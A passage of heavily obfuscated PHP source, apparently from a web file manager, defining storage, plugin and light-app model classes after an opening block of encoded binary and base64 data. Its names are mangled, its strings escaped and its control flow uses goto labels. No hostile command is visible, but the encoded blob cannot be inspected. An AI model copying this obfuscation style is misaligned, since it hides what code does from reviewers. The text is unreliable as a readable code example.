IùezK'."\n".'•Ó!9Ò•w)`ê')."\xe1\xb3\x1a\x93\x72\xeb\x81\xce\xde\x50\x44\xd\x84\xc3\xd1\x95\xe\x2d\x42\x21\xdf\x2f\x71\x91\x49\x5a\x7e\xde\x44\x9a\x19\x31\x9\xf4\xeb\x95\x7e\xdc\xc0\xb\x96\xec\x53\xde\x25\x46\xa1\xd3\x27".base64_decode('u/QrsgsqeISRv4NAo9JjRMWSZli6lEBfymkAexctl3M8LZgblqJl585a9VMq/QBLkw==')."\xdc\x7\x56\x2b\x10\xb\x75\xf7\x24\xfe\xc7\x5d\x35\xd2\xc2\x75\x97\x91\x66\x6a\x31\xdc\x3c\x91\x3e\x91\xd0\x21\x3f\x43\xc9\xbe\x59\xf1\xe0\xd2\x27\x3e\xdd\xe4\x11\x57\x7a\x2a\x71\x68\xc4\xde\x88".base64_decode('M8lxCHh1mhaKqtS3j/gE4k5Kk0X5htWf9nMQ0wD2UBhkF3k4Ig4muDi0hj9Hj6voFA==').base64_decode('jiWG7AjDpG+ITgCcHRoGrkeo3Dq0jiemKr5BHj+geeSSCZUcEoNDMf7YiajqzqnSAQ==')."\x94\xad\x8\x99\x16\x2f\xa0\xb4\x2a\x8d\xf4\x3d\x34\xfe\x90\x85\xb2\x84\x19\x5b\x8b\xf\x10\x3f\x62\xc1\x7c\xd1\x76\x1c\xe5\x7b\x64\x45\x7a\x69\x6e\x68\x2\xe1\x74\xc4\x51\xd\xab\x79\x99\xf9\xc9".base64_decode('igSHICvM+sVVHvEzHoVhU4YfIcjYKoK+W0hlBh50dNDtyjePaPX/k4o0My45jnQ2Ug==')."\xd9\x21\xcb\xbd\xd5\x9\xb6\xb\x3f\xe7\x94\x35\xc7\x9d\x8f\x19\xe2\x14\xf7\x3\x4e\x8e\xa7\x9b\xa4\x45\x43\x6c\x82\xe5\xc7\xa6\x9c\x95\x3c\x15\xcf\xa9\x28\xe4\x1d\x5a\x5\xa1\x3a\xcc\x22\x76\x32"."\305\316\244\244\260\364\351\131\364\147\20\176\331\166\346\356\4\45\124\360\311\172\216\124\35\131\43\227\56\161\145\46\221\320\253\13\101\1\251\205\365\171\64\366\336\56\171\350\255"."\223\321\144\170\301\245\332\253\136\330\77\240\363\41\32\361\276\217\330\73\235\357\235\360\113\170\113\54\6\313\166\274\260\223\60\23\132\306\103\71\62\114\325\104\254\175\122\16\313"."\152\270\144\24\50\223\11\363\322\174\276\227\112\5\330\113\171\151\17\171\270\215\222\72\367\23\61\322\112\343\364\123\256\235\311\231\111\55\27\243\352\176\16\33\232\22\72\115\351"."\154\17\160\24\243\111\176\255\130\24\127\27\362\226\211\376\72\154\27\41\257\77\321\243\22\13\174\225\152\22\304\5\316\111\27\207\64\21\56\21\313\205\20\275\102\161\244\226\244"."\x73\x9e\xec\x72\x95\x5e\xab\x8\x6b\x39\x28\x8e\xfa\xd9\x47\x6f\x4c\x1\x60\x72\x93\xec\x16\x9b\x8b\xc4\xbb\xa4\x77\xd9\xfd\x95\xb7\xde\x58\x91\x11\x28\xa\x79\xef\x59\x68\x80\x10\xeb\x78\xf9\x20"."\6\5\224\45\212\100\15\307\102\306\250\204\270\141\372\64\36\241\24\62\343\376\61\251\322\363\105\360\4\137\265\327\210\50\346\223\237\116\175\230\37\152\160\134\154\356\262\27\21".base64_decode('oRDjfh2v8qU/9qofWzrwpF+Vd/qmfebPIwwjP+6RI2G+53zGGY+Dswb83FBx9HCfOg==')."\70\130\135\25\142\156\40\47\314\112\371\260\320\13\160\74\102\50\215\32\110\133\345\103\206\22\30\244\161\227\113\71\17\121\221\360\60\17\175\125\337\102\164\74\271\344\236\320\52"."\257\51\176\142\203\240\145\115\16\135\151\47\325\153\131\222\54\261\33\146\167\61\303\201\273\152\111\27\246\75\324\265\152\305\6\261\72\237\156\236\63\157\221\54\334\20\123\50\356"."\x5d\xc1\x77\x1\x5c\x1f\x3\xb7\x22\x90\x42\x71\xa2\xa1\xc2\xfc\xb9\xca\xab\x9f\x64\x3a\x15\xe6\x2b\x9f\xe1\x74\xed\x0\xff\xb3\x5\x23\x4e\xf\xb4\xa8\xa4\x8e\x5e\xf9\x60\x71\x5\x4\x8\x9e\x4a"."\372\132\322\206\350\122\306\61\261\176\214\45\126\35\335\2\305\163\233\316\157\121\366\241\312\70\244\175\117\54\26\372\164\242\231\303\147\354\74\226\335\333\45\315\171\240\254\166\156"."\42\220\140\207\64\203\74\73\256\273\373\116\0\3\322\24\221\55\35\254\344\26\155\323\55\12\302\325\361\276\110\304\232\321\102\16\266\155\154\12\56\126\233\104\211\376\7\23\310".base64_decode('zkj0OCX0tPDwHUdrJxT8ZzEyU+WZTEmL5WPGQDk9fjb0arZXQk5JlKjbUTLZQC7EEQ==')."\326\71\156\127\363\250\232\150\143\310\243\114\127\250\222\335\223\136\323\24\216\303\44\106\17\327\146\266\242\323\110\0\210\251\242\223\145\222\137\1\44\346\176\302\117\6\131\272\216"."\x65\x2c\xb9\x4f\x96\xcd\xe5\x48\x43\xf2\xfa\xa8\x6c\x5a\x7a\x53\x51\x48\x88\x88\x48\x9\x46\x4\x8b\x9b\x28\x3b\x90\x6e\x6\xba\xb9\x95\xa5\x26\x29\xdd\x39\xc5\x56\x18\xd4\xd2\x4b\xb8\xa6\x1c\x16"."\123\200\267\200\50\163\104\213\276\356\70\166\242\170\247\353\315\144\102\256\334\17\51\63\20\21\32\41\310\237\144\254\353\70\343\360\127\345\34\147\36\313\375\264\44\342\374\144\307"."\xd2\x28\xea\x7e\x74\x17\xe8\x24\xb1\xc8\xa1\x5f\x93\x76\x5a\xb1\xa9\x8a\x50\xa4\x9c\x17\x11\x49\xd6\x4b\x8e\x57\x3c\xd3\x61\xd3\x8c\xbd\x61\xb9\x48\x2\xb3\x94\xb6\x5c\xf\xcb\x52\x37\xbf\x34\xcc"."\116\1\377\327\257\52\376\277\172\114\161\136\43\223\312\73\336\132\356\6\136\234\261\177\123\222\133\161\52\21\166\215\303\271\233\36\16\130\304\37\31\227\342\134\207\233\171\104\143"."\216\322\64\166\63\246\345\162\322\236\133\375\364\122\361\242\55\102\276\21\376\74\152\265\210\333\342\317\375\272\355\0\173\10\236\74\134\73\124\255\240\40\103\374\220\124\5\217\151"."\22\343\215\245\47\316\215\324\110\225\153\155\242\251\352\164\313\55\361\42\25\305\104\37\20\313\302\134\315\371\131\50\205\117\207\304\377\3\100\117\66\325\215\26\331\71\262\36\210"."\376\320\131\214\70\21\277\0\100\243\144\272\344\110\252\240\146\11\307\234\70\22\145\160\303\34\142\143\147\66\235\216\32\275\256\127\74\151\41\113\206\255\103\222\117\330\233\142\331"."\xed\xb7\x9a\x9e\x84\xe4\x5a\xb2\x22\x44\xe5\x7\x38\xa9\x90\xab\x60\xed\x7a\xa7\xfc\x8b\xbf\xd1\xde\xe8\x7e\xb4\xbd\xc9\xeb\x6a\x8e\xbf\x75\xea\x5c\xe\x8e\xc7\x37\xa9\xf2\x8\x5a\x43\x31\x2c\x14"."\141\142\56\162\137\104\56\216\275\225\165\50\352\307\105\231\151\26\137\165\22\300\73\45\144\176\70\44\303\203\221\222\276\222\111\140\353\114\345\202\42\111\255\131\172\153\274\202\33"."\244\311\263\174\25\373\30\243\252\216\311\304\332\166\274\43\206\111\136\0\140\125\373\173\353\210\171\27\254\5\164\176\351\62\5\126\111\17\177\343\265\53\34\146\142\45\156\42\262"."\224\131\5\146\134\51\231\50\100\222\103\260\150\311\217\255\70\153\142\23\24\347\52\135\132\255\130\312\54\131\122\61\236\136\255\54\106\114\131\160\42\347\341\107\233\155\307\24\211"."\307\34\334\217\70\20\161\2\225\20\70\4\5\160\263\54\47\111\67\255\210\333\117\73\137\205\41\231\44\231\371\126\205\26\244\273\102\347\125\55\167\127\137\101\221\313\106\130\312"."\46\265\230\313\76\364\213\15\120\103\302\43\7\311\246\267\40\201\61\215\73\275\161\327\162\76\25\57\135\354\246\10\102\6\53\357\356\304\225\242\304\317\260\152\370\50\46\266\32"."\x57\x7a\xb5\x97\xcf\x87\xb5\x31\xc1\x8c\x89\xc3\x40\x3a\xdd\xa5\x8d\x55\x29\x9a\x66\xc7\x21\x9e\x8a\x52\x78\x51\xc2\xcc\x49\xb6\xdb\xc2\x7c\x42\x1f\x77\x3f\xd\xed\x93\xed\xbd\x1d\x5\x2b\x53\x85"."\x6d\xb7\x54\x5f\xdc\xe2\x88\x61\xe2\xb4\x6a\xc3\x27\xb\xcd\x59\x5d\xb6\x1d\xe7\x48\x25\x92\xe8\xbb\x1e\x5c\xb\x42\x3a\x78\x61\x35\x11\xa1\x1e\x41\x87\xc2\xe5\xb\xe2\x93\x4e\x4b\x75\x5e\x8c\xcf"."\31\52\103\254\256\274\216\124\327\121\22\213\162\30\147\342\312\262\344\147\235\235\367\265\262\300\103\102\1\75\27\226\232\223\357\162\247\255\20\257\376\21\201\225\116\20\113\46\376".base64_decode('IoNtoqYD+BKJ5AODkjE509Ed99SSk49AX5qYJ3JkmhdwZtHyuqv3cgX3yGgNa9ywUw==')."\131\351\70\126\231\131\231\136\252\0\52\174\250\172\177\335\275\142\60\165\37\122\105\43\25\375\221\24\102\22\146\225\72\264\107\125\253\321\54\134\123\260\305\216\272\323\200\0\327"."\245\131\270\156\105\66\253\54\311\167\244\172\266\126\266\246\31\136\45\360\100\350\221\256\62\140\41\32\220\212\116\7\317\252\205\53\77\7\30\347\56\115\244\44\325\173\41\204\33".base64_decode('rov5ar2oWnjaXojSrl2gGq1lOVWoK6Uc0yqrCAWOSjIv8qqok9BP4i1c9uhVJVvWTQ==')."\xa9\xae\xbd\x12\xab\x4a\x19\x2c\xa7\x5a\x89\x2b\x5d\x86\x1b\x38\x84\x5\xe6\xb\x90\x11\x1d\x58\x73\xc6\x88\x50\xdb\x63\x5a\xfb\xb3\x1c\xe4\xbf\x5c\x18\x29\x98\x7c\x4b\x49\xb\xad\x4c\xac\x51\x1e"."\50\271\341\134\321\232\23\215\13\145\311\307\156\125\43\2\17\26\57\124\36\344\163\32\267\333\22\232\115\364\344\145\332\106\112\167\72\362\225\35\173\321\174\366\221\234\44\273\164"."\211\15\205\260\303\241\366\120\105\230\106\222\200\355\23\22\174\332\236\304\320\10\234\160\330\370\120\66\2\56\76\350\235\151\7\276\233\347\267\145\304\11\55\335\166\151\166\334\54"."\xd9\x1e\x9c\x97\x30\x8b\xe4\xb7\xdd\xb4\x6d\xa1\x43\x40\xa5\xb\x84\x57\xc4\x7b\xa7\x47\x52\x91\x41\x21\x71\x35\x86\x3b\x45\xee\x5c\x8\xda\x12\xea\x43\x82\x70\x7b\x8b\x8f\xed\x71\x9d\xe6\x12\x9a"."\xe5\x88\xe0\xbb\x1c\x1e\x91\xb7\x46\xb8\xc5\xed\x2a\xbb\xee\x99\x45\x2\x3a\x23\x27\xcd\x9\xe6\x4d\xb\x3b\x1a\x10\xfd\x11\xb7\x3d\x9a\x9b\x1f\x14\xac\xc\xa0\xa2\xac\xf0\x43\xdc\x39\x58\x7e\x9a"."\xe3\x87\x67\x22\xbc\xa4\xd\x78\x96\xce\xb7\xb6\x98\x71\x54\xa7\xf\x7a\x71\xc5\xdc\x8f\x6b\x1\x24\xbe\xa2\x9\xea\x23\x9e\x88\xdf\xc0\x6\x29\x9e\x88\x57\x64\xf5\x5\xe2\xf1\x95\xd1\x58\x27\x75".base64_decode('KV+RTWpJClQVWX090ch0ecHeQChckYd1rSKq8MtGs0J9pJfkwnK6XoQ6lomekKtxcQ==')."\221\120\314\232\354\176\200\135\264\304\265\34\23\25\110\202\146\75\57\34\362\211\72\116\11\210\74\257\26\363\234\311\3\316\267\233\134\52\215\14\141\241\41\254\47\25\201\266\143"._kodDe('Lzzb20qOUWqeYr2qeo5tFjI5L1oW/3L4CtPWiCwjE/RDG3+dZwOrqBDv8VKnolaK9sY=')."\232\111\351\322\203\236\170\300\12\30\100\52\351\302\321\260\43\333\326\62\125\257\306\251\200\21\257\176\41\372\373\337\171\155\75\117\116\257\0\0".""."", 10, -8))); goto A¬ÏòìÈÛå; c¯É‡ÇŸÍ…: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\163\157\165\x72\x63\145\x53\x65\143\x72\145\x74\114\151\163\164"; public $field = array("\x73\x6f\x75\x72\x63\x65\x49\104", "\164\x79\160\145\111\x44", "\143\x72\x65\141\x74\x65\125\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\163\164\157\162\141\x67\145\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x73\x69\x7a\145\x4d\141\x78", "\x73\x79\x73\x74\145\155", "\144\145\146\x61\165\154\164", "\144\162\x69\166\x65\x72", "\143\157\x6e\x66\151\x67"); public function listData($Ô„¶×à = false, $¥©±¬¬» = "\155\x6f\144\x69\x66\x79\x54\151\155\145", $¡¹ÏÙÈº = false) { $ëÌÕèï =& $_SERVER[ ÇƒŠìÀ]; $ö±Ê¡µ™ = parent::listData($Ô„¶×à, $¥©±¬¬», $¡¹ÏÙÈº); if ($Ô„¶×à) { return $ö±Ê¡µ™; } $ª“ÜÒßß = $this->ioSizeUseGet(array_to_keyvalue($ö±Ê¡µ™, $ëÌÕèï[12], $ëÌÕèï[445])); foreach ($ö±Ê¡µ™ as $¸¨¨“² => $Ã¦Á÷İ) { unset($ö±Ê¡µ™[$¸¨¨“²][$ëÌÕèï[6]]); $ö±Ê¡µ™[$¸¨¨“²][$ëÌÕèï[1876]] = isset($ª“ÜÒßß[$Ã¦Á÷İ[$ëÌÕèï[445]]]) ? $ª“ÜÒßß[$Ã¦Á÷İ[$ëÌÕèï[445]]] : 0; } return $ö±Ê¡µ™; } public function ioSizeUseGet($Ó¼…ô÷ï) { $ñ‡­Ú¬Ü =& $_SERVER[ ÇƒŠìÀ]; if (!$Ó¼…ô÷ï) { return array(); } $º™äÒ = $ñ‡­Ú¬Ü[2210] . implode($ñ‡­Ú¬Ü[50], $Ó¼…ô÷ï); $ï»›Òıİ = Cache::get($º™äÒ); if ($ï»›Òıİ) { return $ï»›Òıİ; } $²Õë­Íè = array($ñ‡­Ú¬Ü[846] => $ñ‡­Ú¬Ü[445], $ñ‡­Ú¬Ü[2211] => $ñ‡­Ú¬Ü[78]); $Š“º¼‰¿ = array($ñ‡­Ú¬Ü[846] => array($ñ‡­Ú¬Ü[7], $Ó¼…ô÷ï)); $ï»›Òıİ = Model($ñ‡­Ú¬Ü[818])->field($²Õë­Íè)->where($Š“º¼‰¿)->group($ñ‡­Ú¬Ü[846])->select(); $ï»›Òıİ = array_to_keyvalue($ï»›Òıİ, $ñ‡­Ú¬Ü[445], $ñ‡­Ú¬Ü[78]); Cache::set($º™äÒ, $ï»›Òıİ, 600); return $ï»›Òıİ; } public function getConfig($¡ú…Ç„) { $µï™ÁóÂ = parent::listData($¡ú…Ç„); return json_decode($µï™ÁóÂ[$_SERVER[ ÇƒŠìÀ][6]], !0); } public function update($˜÷óºÒ‡, $’”í³²è) { $†¤½–ó =& $_SERVER[ ÇƒŠìÀ]; $Åéã¡ = $’”í³²è[$†¤½–ó[32]]; $·Ø‡” = array_to_keyvalue(parent::listData(), $†¤½–ó[32]); if (isset($·Ø‡”[$Åéã¡]) && $·Ø‡”[$Åéã¡][$†¤½–ó[445]] != $˜÷óºÒ‡) { return !1; } $this->checkPwd($˜÷óºÒ‡, $’”í³²è); if (isset($’”í³²è[$†¤½–ó[2212]]) && $’”í³²è[$†¤½–ó[2212]] == $†¤½–ó[90]) { $this->checkConfig($’”í³²è); } unset($’”í³²è[$†¤½–ó[2212]]); $˜¾¼ëÖ  = parent::update($˜÷óºÒ‡, $’”í³²è); if ($˜¾¼ëÖ  && $’”í³²è[$†¤½–ó[37]]) { $ÂÕ¬ Œş = 0; foreach ($·Ø‡” as $›ûóëË ) { if ($›ûóëË [$†¤½–ó[37]] && $›ûóëË [$†¤½–ó[445]] != $˜÷óºÒ‡) { $ÂÕ¬ Œş = $›ûóëË [$†¤½–ó[445]]; parent::update($›ûóëË [$†¤½–ó[445]], array($†¤½–ó[37] => 0)); } } $this->updateBackup($˜÷óºÒ‡, $ÂÕ¬ Œş); } return $˜¾¼ëÖ ; } public function add($Ê­ª´Åã) { $ØìİĞ¡’ =& $_SERVER[ ÇƒŠìÀ]; $Ó ŠÊÆ€ = array_to_keyvalue(parent::listData(), $ØìİĞ¡’[32]); if (isset($Ó ŠÊÆ€[$Ê­ª´Åã[$ØìİĞ¡’[32]]])) { return !1; } $this->checkConfig($Ê­ª´Åã); $ÉÏ—Ê²´ = parent::insert($Ê­ª´Åã); if ($ÉÏ—Ê²´ && $Ê­ª´Åã[$ØìİĞ¡’[37]]) { foreach ($Ó ŠÊÆ€ as $¨†š¾æ‰) { if ($¨†š¾æ‰[$ØìİĞ¡’[37]]) { parent::update($¨†š¾æ‰[$ØìİĞ¡’[445]], array($ØìİĞ¡’[37] => 0)); } } } return $ÉÏ—Ê²´; } public function updateBackup($êÅä¼šŸ, $€×ï«§¼) { $Ê‹³  =& $_SERVER[ ÇƒŠìÀ]; if (!$€×ï«§¼) { return; } $®õğ¾æš = Model($Ê‹³ [778])->config(); if ($®õğ¾æš[$Ê‹³ [1659]] != $Ê‹³ [90] || $®õğ¾æš[$Ê‹³ [780]] != $€×ï«§¼) { return; } $àÁ·“© = Model($Ê‹³ [799])->get($Ê‹³ [809]); $àÁ·“© = json_decode($àÁ·“©, !0); if (!$àÁ·“©) { return; } $àÁ·“©[$Ê‹³ [780]] = $êÅä¼šŸ; Model($Ê‹³ [799])->set(array($Ê‹³ [809] => $àÁ·“©)); } public function checkPwd($Íù‘¥Û², &$¥×´òò·) { $“¥˜«ÕÙ =& $_SERVER[ ÇƒŠìÀ]; if (empty($¥×´òò·[$“¥˜«ÕÙ[6]])) { return; } $•ÜÀñÃ˜ = json_decode($¥×´òò·[$“¥˜«ÕÙ[6]], !0); $„Ô¶Â° = $“¥˜«ÕÙ[12]; $©•§ëè = array($“¥˜«ÕÙ[2213], $“¥˜«ÕÙ[2214], $“¥˜«ÕÙ[922]); foreach ($©•§ëè as $Êã»ä®) { if (isset($•ÜÀñÃ˜[$Êã»ä®])) { $„Ô¶Â° = $Êã»ä®; break; } } if (!$„Ô¶Â°) { return; } $Ï‹÷ùÍÇ = $this->getConfig($Íù‘¥Û²); $¥Âıìù‚ = $Ï‹÷ùÍÇ[$„Ô¶Â°]; $œß‰Ó¶ = $•ÜÀñÃ˜[$„Ô¶Â°]; if ($œß‰Ó¶ == str_repeat($“¥˜«ÕÙ[205], strlen($¥Âıìù‚))) { $•ÜÀñÃ˜[$„Ô¶Â°] = $¥Âıìù‚; $¥×´òò·[$“¥˜«ÕÙ[6]] = json_encode($•ÜÀñÃ˜); } else { if ($œß‰Ó¶ != $¥Âıìù‚) { $¥×´òò·[$“¥˜«ÕÙ[2212]] = $“¥˜«ÕÙ[90]; } } } public function checkConfig(&$‹¡à•¨, $—îäŒõ = false) { $¬Äá£æÅ =& $_SERVER[ ÇƒŠìÀ]; $æ³«Óœ = strtolower($‹¡à•¨[$¬Äá£æÅ[97]]); $ó¾Òëç¦ = json_decode($‹¡à•¨[$¬Äá£æÅ[6]], !0); foreach ($ó¾Òëç¦ as $–¶¤ş€â => $¥ÓƒéµÔ) { if (is_string($¥ÓƒéµÔ)) { $ó¾Òëç¦[$–¶¤ş€â] = trim($¥ÓƒéµÔ); } } $ó¾Òëç¦[$¬Äá£æÅ[2215]] = rand_string(6); $ÕŠÇƒİ© = $GLOBALS[$¬Äá£æÅ[6]][$¬Äá£æÅ[91]][$¬Äá£æÅ[855]]; $ğéå·‚ = isset($ÕŠÇƒİ©[$æ³«Óœ]) ? $ÕŠÇƒİ©[$æ³«Óœ] : ucfirst($æ³«Óœ); $áœĞ†Šò = $¬Äá£æÅ[76] . $ğéå·‚; if (!$ğéå·‚ || !class_exists($áœĞ†Šò)) { if ($—îäŒõ) { return LNG($¬Äá£æÅ[2216]); } write_log(array($¬Äá£æÅ[2217], $‹¡à•¨, get_caller_info()), $¬Äá£æÅ[2218]); show_json(LNG($¬Äá£æÅ[2216]), !1, $‹¡à•¨); } $¢Úì°Ã‹ = new $áœĞ†Šò($ó¾Òëç¦); if (in_array($æ³«Óœ, $¢Úì°Ã‹->objectDriver)) { if (!$¢Úì°Ã‹->isBucketCors() && !$¢Úì°Ã‹->setBucketCors()) { $é¿¨ş» = LNG($¬Äá£æÅ[2219]); $é¿¨ş» .= $¬Äá£æÅ[2220] . LNG($¬Äá£æÅ[2221]); if ($—îäŒõ) { return $é¿¨ş»; } show_json($é¿¨ş», !1); } } $ïœÓ”õ = rtrim($ó¾Òëç¦[$¬Äá£æÅ[1215]], $¬Äá£æÅ[8]) . $¬Äá£æÅ[8]; $±µ¥Îí— = $¢Úì°Ã‹->getPath($ïœÓ”õ . $¬Äá£æÅ[1219]); if (!$¢Úì°Ã‹->mkfile($±µ¥Îí—)) { if ($—îäŒõ) { return LNG($¬Äá£æÅ[2219]); } show_json(LNG($¬Äá£æÅ[2219]), !1); } $ó¾Òëç¦[$¬Äá£æÅ[1215]] = $ïœÓ”õ; $‹¡à•¨[$¬Äá£æÅ[6]] = json_encode($ó¾Òëç¦); $‹¡à•¨[$¬Äá£æÅ[97]] = $ğéå·‚; return !0; } public function driverListSystem() { $ûÁğÙêç =& $_SERVER[ ÇƒŠìÀ]; $Ä• Ğä× = parent::listData(); $ÈïİÜ«œ = array(); foreach ($Ä• Ğä× as $¦åø¯Æë) { unset($¦åø¯Æë[$ûÁğÙêç[217]], $¦åø¯Æë[$ûÁğÙêç[87]]); $¦åø¯Æë[$ûÁğÙêç[6]] = json_decode($¦åø¯Æë[$ûÁğÙêç[6]], !0); $ÈïİÜ«œ[] = $¦åø¯Æë; } return $ÈïİÜ«œ; } public function defaultDriver() { $œ¼°èÀˆ =& $_SERVER[ ÇƒŠìÀ]; $Æµ€÷¶ = parent::listData(); $¸²ÛŸ² = array_filter_by_field($Æµ€÷¶, $œ¼°èÀˆ[37], 1); $¸²ÛŸ² = $¸²ÛŸ²[0]; if ($¸²ÛŸ²) { $¸²ÛŸ²[$œ¼°èÀˆ[6]] = json_decode($¸²ÛŸ²[$œ¼°èÀˆ[6]], !0); } return $¸²ÛŸ²; } public function driverInfo($ÔÍì™„ê) { $¸ÊåŞ«Ä =& $_SERVER[ ÇƒŠìÀ]; $¼ä§á†¹ = array_to_keyvalue(parent::listData(), $¸ÊåŞ«Ä[445]); if (!isset($¼ä§á†¹[$ÔÍì™„ê])) { return !1; } $¹àŠ„†Ì = $¼ä§á†¹[$ÔÍì™„ê]; $¹àŠ„†Ì[$¸ÊåŞ«Ä[6]] = json_decode($¹àŠ„†Ì[$¸ÊåŞ«Ä[6]], !0); return $¹àŠ„†Ì; } public function remove($ËÍ‘¦ĞÈ) { $this->removeShareItems($ËÍ‘¦ĞÈ); return parent::remove($ËÍ‘¦ĞÈ); } public function removeWithFile($İÌêËšÌ, $‹õ…¦ä¿) { $÷­‰Ÿà¥ =& $_SERVER[ ÇƒŠìÀ]; $ñÍè“¢ê = array($÷­‰Ÿà¥[846] => $İÌêËšÌ); $„û‚Ùç¢ = Model($÷­‰Ÿà¥[514])->where($ñÍè“¢ê)->count(); $¤ïç¨Ûú = Model($÷­‰Ÿà¥[514])->where($ñÍè“¢ê)->sum($÷­‰Ÿà¥[78]); $İåŸÓ™ß = $‹õ…¦ä¿ . $÷­‰Ÿà¥[2222] . $İÌêËšÌ; $ÃÙ—•™ = LNG($‹õ…¦ä¿ == $÷­‰Ÿà¥[590] ? $÷­‰Ÿà¥[2223] : $÷­‰Ÿà¥[2224]); $äûÄ°¿§ = new TaskFileTransfer($İåŸÓ™ß, $÷­‰Ÿà¥[2218], $„û‚Ùç¢, $ÃÙ—•™ . "\x28{$İÌêËšÌ}\x29"); $äûÄ°¿§->task[$÷­‰Ÿà¥[792]] = (double) $¤ïç¨Ûú; $™‘ê‘¦ = KodIO::defaultDriver(); $°ÏùÕÜ† = $™‘ê‘¦[$÷­‰Ÿà¥[445]]; $„ğØ†üø = "\173\151\157\x3a{$°ÏùÕÜ†}\175\57"; $Ï½şğåè = !0; $Ì‹ “½Á = array(); $Äá¼ç˜Õ = Model($÷­‰Ÿà¥[216])->where($ñÍè“¢ê)->field($÷­‰Ÿà¥[2225])->select(); foreach ($Äá¼ç˜Õ as $Ÿ¼ áƒÉ) { $âÀµôÛÙ = $Ÿ¼ áƒÉ[$÷­‰Ÿà¥[86]]; $À­¹Å†ß = $„ğØ†üø . str_replace("\x7b\x69\157\72{$İÌêËšÌ}\x7d\x2f", $÷­‰Ÿà¥[12], $âÀµôÛÙ); if (!IO::exist($âÀµôÛÙ)) { $Ì‹ “½Á[] = $Ÿ¼ áƒÉ[$÷­‰Ÿà¥[511]]; $äûÄ°¿§->updateFileEnd($Ÿ¼ áƒÉ[$÷­‰Ÿà¥[32]], $Ÿ¼ áƒÉ[$÷­‰Ÿà¥[78]]); continue; } if (IO::exist($À­¹Å†ß)) { $äûÄ°¿§->updateFileEnd($Ÿ¼ áƒÉ[$÷­‰Ÿà¥[32]], $Ÿ¼ áƒÉ[$÷­‰Ÿà¥[78]]); continue; } if (!IO::move($âÀµôÛÙ, get_path_father($À­¹Å†ß))) { $Ï½şğåè = !1; break; } $ñÍè“¢ê = array($÷­‰Ÿà¥[511] => $Ÿ¼ áƒÉ[$÷­‰Ÿà¥[511]]); $šÇÌÒŠ = array($÷­‰Ÿà¥[846] => $°ÏùÕÜ†, $÷­‰Ÿà¥[86] => $À­¹Å†ß); Model($÷­‰Ÿà¥[216])->where($ñÍè“¢ê)->save($šÇÌÒŠ); } $this->removeByFileID($Ì‹ “½Á); if (!$Ï½şğåè) { $äûÄ°¿§->stop($İåŸÓ™ß); return !1; } $äûÄ°¿§->end(); if ($‹õ…¦ä¿ == $÷­‰Ÿà¥[1856]) { $this->remove($İÌêËšÌ); } } public function progress($Ÿ™‡å—ê, $¡ˆ‘¾ú) { return Task::get($¡ˆ‘¾ú . $_SERVER[ ÇƒŠìÀ][2222] . $Ÿ™‡å—ê); } private function removeByFileID($ãŒ«‹Ûş = array()) { $í‡Ï– =& $_SERVER[ ÇƒŠìÀ]; if (empty($ãŒ«‹Ûş)) { return; } $–©çÚ¶› = array($í‡Ï–[511] => array($í‡Ï–[7], $ãŒ«‹Ûş)); $¶åÛ ÀÍ = Model($í‡Ï–[1368])->where($–©çÚ¶›)->field($í‡Ï–[183])->select(); if (!$¶åÛ ÀÍ) { return; } $¶åÛ ÀÍ = array_to_keyvalue($¶åÛ ÀÍ, $í‡Ï–[12], $í‡Ï–[183]); foreach ($¶åÛ ÀÍ as $ôÛŒÊ µ) { Model($í‡Ï–[460])->removeNow($ôÛŒÊ µ, !1); } } private function removeShareItems($áÆĞğÒ) { $´·×Ä²Ï =& $_SERVER[ ÇƒŠìÀ]; $¾õÚ¬‡ = "\x7b\151\x6f\x3a{$áÆĞğÒ}\x7d\57"; $Å£İÃèÈ = array($´·×Ä²Ï[183] => 0, $´·×Ä²Ï[1210] => array($´·×Ä²Ï[429], "{$¾õÚ¬‡}\45")); $†–³…åü = Model($´·×Ä²Ï[1867])->where($Å£İÃèÈ)->field($´·×Ä²Ï[635])->select(); if (empty($†–³…åü)) { return; } $Ã×¼‡ ¢ = array_to_keyvalue($†–³…åü, $´·×Ä²Ï[12], $´·×Ä²Ï[635]); Model($´·×Ä²Ï[634])->remove($Ã×¼‡ ¢); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x4c\x69\147\150\x74\x41\x70\160"; public $modelType = "\123\171\x73\x74\x65\155\x4f\160\164\x69\157\156"; public $field = array("\156\141\x6d\x65", "\x67\x72\x6f\165\x70", "\x64\145\x73\x63", "\143\157\x6e\164\x65\156\164"); public function listData($¬ÍÙÛ¼Â = false, $üîµ±Ğ… = "\155\x6f\144\151\x66\x79\124\x69\155\x65", $ªíÁ¥˜† = true) { return parent::listData($¬ÍÙÛ¼Â, $üîµ±Ğ…, $ªíÁ¥˜†); } public function remove($›§¬§³£) { $°»ßˆÜŠ = $this->findByName($›§¬§³£); if (!$°»ßˆÜŠ) { return !1; } return parent::remove($°»ßˆÜŠ[$_SERVER[ ÇƒŠìÀ][445]]); } public function add($„ßÄ×šš) { if ($this->findByName($„ßÄ×šš[$_SERVER[ ÇƒŠìÀ][32]])) { return !1; } return parent::insert($„ßÄ×šš); } public function update($ïëƒ¨ö, $ğŞó÷ô) { $Ç§‰ÅÆ =& $_SERVER[ ÇƒŠìÀ]; $Ø–ğ™÷ = $this->findByName($ïëƒ¨ö); $ÛÛ‘²ƒã = $this->findByName($ğŞó÷ô[$Ç§‰ÅÆ[32]]); if (!$Ø–ğ™÷ || $ÛÛ‘²ƒã && $ÛÛ‘²ƒã[$Ç§‰ÅÆ[445]] != $Ø–ğ™÷[$Ç§‰ÅÆ[445]]) { return !1; } return parent::update($Ø–ğ™÷[$Ç§‰ÅÆ[445]], $ğŞó÷ô); } } goto bæĞ©ôöÇï; eãˆÓ´—° : class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\160\x6c\x75\x67\151\x6e\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\x61\x74\x75\x73", "\x72\x65\x67\x69\x65\x73\x74", "\143\157\x6e\x66\151\x67"); public function loadList($½±º°·• = false) { $ñ†‰ÕåÃ = array_to_keyvalue($this->listData(), $_SERVER[ ÇƒŠìÀ][32]); if ($½±º°·•) { return $ñ†‰ÕåÃ[$½±º°·•]; } return $ñ†‰ÕåÃ; } public function init() { $‹À­„ï =& $_SERVER[ ÇƒŠìÀ]; 